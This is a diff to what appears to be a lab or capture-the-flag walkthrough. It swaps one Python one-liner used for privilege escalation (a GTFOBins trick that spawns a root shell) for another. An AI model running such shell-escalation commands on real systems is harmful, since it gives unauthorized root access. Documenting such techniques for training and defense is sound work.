@@ -88,7 +88,7 @@ Used GTFOBins trick:
 ![2025-05-07_13-13](https://github.com/user-attachments/assets/74f94857-4ef3-4925-be3d-f2accd3ab6b7)
 
 ```bash
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 ![2025-05-07_13-14](https://github.com/user-attachments/assets/64f56252-548d-467c-b596-8ce1a922af1a)
